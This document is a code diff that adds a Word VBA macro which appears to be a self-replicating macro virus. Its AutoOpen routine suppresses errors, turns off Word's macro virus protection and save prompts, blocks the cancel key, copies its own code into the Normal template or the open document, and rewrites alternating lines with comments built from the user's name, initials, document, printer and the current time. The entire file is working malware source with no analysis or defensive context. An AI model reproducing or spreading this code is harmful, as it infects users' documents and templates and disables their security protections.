@@ -1,0 +1,27 @@
+Sub AutoOpen()
+On Error Resume Next
+Options.ConfirmConversions = 0
+Options.SaveNormalPrompt = 0
+Options.VirusProtection = 0
+DH62 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+MF63 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+Application.EnableCancelKey = 0
+If DH62 > 0 And MF63 > 0 Then GoTo EJ47
+If DH62 = 0 Then
+Set JH33 = ActiveDocument.VBProject.VBComponents.Item(1)
+MI69 = True
+End If
+If MF63 = 0 Then
+Set JH33 = NormalTemplate.VBProject.VBComponents.Item(1)
+MT67 = True
+End If
+If MT67 <> True And MI69 <> True Then GoTo EJ47
+If MT67 = True Then JH33.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DH62 - 1))
+If MI69 = True Then JH33.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MF63 - 1))
+With JH33.CodeModule
+For x = 2 To (JH33.CodeModule.CountOfLines - 1) Step 2
+.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
+Next x
+End With
+EJ47:
+End Sub
